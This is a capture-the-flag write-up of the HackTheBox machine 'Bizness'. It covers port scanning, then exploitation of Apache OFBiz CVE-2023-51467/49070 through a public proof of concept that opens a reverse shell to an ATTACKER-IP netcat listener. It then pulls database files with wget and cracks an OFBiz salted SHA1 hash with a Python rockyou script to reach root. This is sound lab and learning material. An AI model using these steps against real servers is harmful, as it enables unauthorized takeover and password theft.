# **Bizness | HTB**

***

![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/db5be50c-eaa2-44a8-9160-d1e32ab85367)

***

Running our nmap scan we have -:


```bash
# Nmap 7.94SVN scan initiated Sat Feb  3 22:30:51 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt 10.10.11.252
Increasing send delay for 10.10.11.252 from 0 to 5 due to 127 out of 317 dropped probes since last increase.
Increasing send delay for 10.10.11.252 from 5 to 10 due to 103 out of 257 dropped probes since last increase.
Warning: 10.10.11.252 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.252
Host is up (0.17s latency).
Not shown: 59091 closed tcp ports (conn-refused), 6440 filtered tcp ports (no-response)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp    open  http       nginx 1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
| http-methods: 
|_  Supported Methods: GET POST OPTIONS
|_http-server-header: nginx/1.18.0
443/tcp   open  ssl/http   nginx 1.18.0
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://bizness.htb/
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Issuer: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-12-14T20:03:40
| Not valid after:  2328-11-10T20:03:40
| MD5:   b182:2fdb:92b0:2036:6b98:8850:b66e:da27
|_SHA-1: 8138:8595:4343:f40f:937b:cc82:23af:9052:3f5d:eb50
|_http-server-header: nginx/1.18.0
| tls-alpn: 
|_  http/1.1
38857/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb  3 22:33:52 2024 -- 1 IP address (1 host up) scanned in 181.03 seconds
```





 Navigating to port 443 we have a https://bizness.htb website, in which we can go ahead and add to our `/etc/hosts` folder


![](https://i.imgur.com/Qi6A6ah.png)

 Nothing seems to show up in source code analysis but running directory bruteforce we have a login panel URL


![](https://i.imgur.com/Bt3tdqI.png)



Navigating to the URL we truly have a login panel, in which we don't have any usernames nor passwords yet



![](https://i.imgur.com/lLrGX8D.png)



Source Code analysis shows the version of the technology and it name called "**Apache OFBiz**"(18.12)



![](https://i.imgur.com/KOrYvD8.png)


Made more enumeration and found an exploit to ofbiz unauthenticated RCE -:


[CVE-2023-51467 and CVE-2023-49070 POC](https://github.com/UserConnecting/Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz)


> An unauthenticated attacker can use this vulnerability to successfully take over Apache OFBiz.


To exploit this, first of all download this `.jar` file with the following command


```bash
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
```

Then start up your listener on port 1337 with netcat and run the exploit as follows


```bash
# Start listener
nc -lvnp 1337

# Launch exploit
python3 exploit.py https://bizness.htb shell ATTACKER-IP:1337
```



![](https://i.imgur.com/rFBUU1I.png)


Running `linpeas.sh` i was able to gather few important directories

```
1. /var/lib/apt/
2. /opt/ofbiz/.github/workflows/
3. /opt/ofbiz/runtime/data/derby/ofbiz/log/           
4. /opt/ofbiz/runtime/logs/
```


The directory with the listing of `3.` (derby) had important `.DAT` files go ahead and download them Recursively with `python` and `wget`



```bash
# Target machine
python3 -m http.server 1337

# Attacker machine
wget -r 10.10.11.252:1337/
```


After some few enumeration on this files, i found out that where some hashes stored in most of the files


![](https://i.imgur.com/Zk3ySX1.png)


```
strings *.dat | grep SHA
```


Cracking this hash with `hashcat` or `JRP` does not even work, asked for few hints and was told that the hash was hashed with this java [Function](https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java)
Then i Holla a friend since i ain't pretty good at `python` and then they made this up for me using the hashlib, base64 and os library to decrypt this hash 




```python
import hashlib  
import base64  
import os  
def cryptBytes(hash_type, salt, value):  
    if not hash_type:  
        hash_type = "SHA"  
    if not salt:  
        salt = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')  
    hash_obj = hashlib.new(hash_type)  
    hash_obj.update(salt.encode('utf-8'))  
    hash_obj.update(value)  
    hashed_bytes = hash_obj.digest()  
    result = f"${hash_type}${salt}${base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')}"  
    return result  
def getCryptedBytes(hash_type, salt, value):  
    try:  
        hash_obj = hashlib.new(hash_type)  
        hash_obj.update(salt.encode('utf-8'))  
        hash_obj.update(value)  
        hashed_bytes = hash_obj.digest()  
        return base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')  
    except hashlib.NoSuchAlgorithmException as e:  
        raise Exception(f"Error while computing hash of type {hash_type}: {e}")  
hash_type = "SHA1"  
salt = "d"  
search = "$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I="  
wordlist = '/usr/share/wordlists/rockyou.txt'  
with open(wordlist,'r',encoding='latin-1') as password_list:  
    for password in password_list:  
        value = password.strip()  
        hashed_password = cryptBytes(hash_type, salt, value.encode('utf-8'))  
        # print(hashed_password)  
        if hashed_password == search:  
            print(f'Found Password:{value}, hash:{hashed_password}')
```


![](https://i.imgur.com/AemGRaE.png)


Funny enough this password gave us access as user root


![](https://i.imgur.com/i30RpVU.png)




**_Things i Would take good note of_ -:**


- Get much better at python
- Patience is key, wouldn't have found those hashes if i wasn't careful with my `linpeas` result and wasn't also looking out for it in the main logs folder



GG

![](https://i.pinimg.com/originals/bb/83/ac/bb83ac696e85c4710a5b89c6d6eeac81.gif)


<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>

